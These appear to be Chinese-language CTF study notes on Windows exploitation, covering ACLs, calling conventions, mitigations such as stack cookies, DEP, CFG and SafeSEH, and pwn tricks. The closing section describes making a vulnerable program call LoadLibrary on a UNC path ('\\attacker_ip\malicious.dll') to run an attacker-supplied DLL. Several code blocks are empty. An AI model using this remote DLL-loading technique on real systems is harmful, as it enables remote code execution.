# windows權限管理
Windows下，每個用戶的標識被稱為SID，而對象(文件、設備、內存區等)的權限管理由**安全性描述項(Security Descriptor, SD)**控制。

安全性描述項(Security Descriptor, SD)中包含owner、grout的SID、Discretionary ACL和system ACL。

**ACL(Access Control List, 存取控制表)**是用來控制對象訪問存取權限的列表，其中包含多個**ACE(Access Control Entry, 存取控制條目)**，每個ACE描述了一個用戶對於當前對象的權限。

在windows中，用戶可以使用`icacls`命令修改一個對象的ACL。
icacls採用微軟制定的**SDDL(Security Descriptor Definition Language,安全描述定義語言)**

通過`icacls`查看文件權限
```
PS C:\Users\islab\Desktop> icacls flag.txt
flag.txt NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         DESKTOP-3O0PPJI\islab:(I)(F)

已順利處理 1 個檔案; 0 個檔案處理失敗
```

可以看到有三個SID對flag.txt有完全存取的權限，嘗試刪除其中一個對於flag.txt的存取權限:
```
PS C:\Users\islab\Desktop> icacls flag.txt /inheritance:d
已處理的檔案: flag.txt
已順利處理 1 個檔案; 0 個檔案處理失敗

PS C:\Users\islab\Desktop> icacls flag.txt /remove islab
已處理的檔案: flag.txt
已順利處理 1 個檔案; 0 個檔案處理失敗

PS C:\Users\islab\Desktop> icacls flag.txt
flag.txt NT AUTHORITY\SYSTEM:(F)
         BUILTIN\Administrators:(F)

已順利處理 1 個檔案; 0 個檔案處理失敗
```

在修改文件的ACL時，若修改的ACE項是繼承的，要先去關閉其繼承屬性。ACL的繼承是windows特有的一種機制，若一個文件啟用的ACL繼承，則其ACL會繼承其父對象(本例中為flag.txt所在的目錄)ACL中的ACE。

# windows的呼叫約定(calling convention)
32bit的windows通常採用**__stdcall**的呼叫約定，參數由右到左的順序逐一被放入stack中，並且在呼叫完成後，由被呼叫的函式來清理這些參數，函數的返回值會放在eax中。    
64bit的windows通常採用**x64**的呼叫約定，其中前4個參數會被分別放入rcx、rdx、r8、r9中，更多的參數會存在stack上，返回值放在rax中。在這個呼叫約定下rax、rcx、rdx、r8、r9、r10、r11由呼叫方保存，rbx、rbp、rdi、rsi、rsp、r12、r13、r14、r15由被呼叫方保存。

# windows的漏洞緩解機制
## stack cookie    
windows與linux的stack cookie有不同的實現。例如:
```c
#include <cstdio>
#include <cstdlib>

int main(int argc, char* argv[]) {
    char name[100];

    printf("Name?: ");
    scanf("%s", name);
    printf("Hello, %s\n", name);
    return 0;
}
```

經過編譯器橫產生的組語如下:
```

```
可以看到，__security_cookie就是windows的stack cookie。注意，程序在將stack cookie放入stack前，程序還將其與rsp進行了XOR，這在某種程度上增強了保護程度，攻擊者需要同時知道當前stack top address和stack cookie才能夠進行stack overflow漏洞的利用。

## DEP
Data Execution Prevention，資料執行保護。與linux下的保護機制NX類似，將資料區的存保護屬性設為可讀可寫不可執行。這兩個機制都是為了防止攻擊者利用資料區域放置惡意程式碼，從而達到任意程式碼執行。

## CFG
Control Flow Guard, 控制流保護。是windows支持的一種比較新的保護機制。被保護的間接呼叫如下，每次進行間接呼叫前都會由**__guard_dispatch_icall_fptr**函式對function pointer進行檢查。在function pointer被修改到非法address時，程序會被異常終止。
```

```

## SEHOP、SafeSEH
SEH是windows底下特有的一種異常處理機制。在32bit的windows下，SEH的資料是一個單向link list且存在stack上。由於這些資料中包含SEH Handler的address，覆蓋SEH成為了攻擊早期windows以及其程序的常利用技巧，因此微軟在新版window中引入了SEHOP和SafeSEH這兩個緩解措施。SEHOP會檢測SEH link list的末尾是不是指向一個固定的SEH Handler，否則異常終止程序。SafeSEH會檢測當前使用的SEH Handler是否指向當前模塊的一個有效地址，否則異常終止程序。

## Heap Randomization
LFH(low-fragmentaion Heap)的隨機化。例如:
```c
#include <cstdio>
#include <cstdlib>
#include <Windows.h>

#define HALLOC(x) (HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (x)))

int main() {
    for(int i = 0; i < 20; i++) {
        printf("Alloc: %p\n", HALLOC(0x30));
    }
    return 0;
}
```
程序結果如下:
```

```
一般的內存分配器對於連續的申請會返回連續的地址，不過可以看到，分配到的地址定不是連續的，而且沒有規律可言。在LFH開啟的情況下，heap的分配是隨機的，使得攻擊者的利用更為困難。

# windows的PWN技巧
## 從heap上洩漏stack sddress
通常情況下，heap上是不會有stack上地址的，因為stack上的資料一般比heap上的資料存在時間更短。不過在windows下有一種特殊情況，導致heap上存有stack address: 在CRT初始化的過程中，由於使用了未初始化內存，導致一部分包含stack address的內容被複製到heap上。於是可以從heap上找到stack address，然後修改stack資料。

## LoadLibrary UNC 下載模塊
由於一般的windows Pwnable沒有辦法直接執行system彈shell，因此需要使用各種各樣的shellcode來完成想要的操作，但是這樣做相當麻煩，在測試shellcode的時候可能發生本地與遠端環境不同等情況，如果能呼叫LoadLibrary，工作量就能大大減輕。    
LoadLibrary是windows下用來下載DLL的function，由於其支持UNC Path，因此可以呼叫**LoadLibrary("\\attacker_ip\malicious.dll")**，讓程式下載遠端伺服器上攻擊者提供的DLL，從而達到執行任意程式執行。這樣的攻擊方式比執行shellcode更穩定。    
因此，win10中引入了**Disable Remote Image Loading**機制，若程式執行時開啟此項緩解措施，則無法使用UNC PATH下載遠端DLL。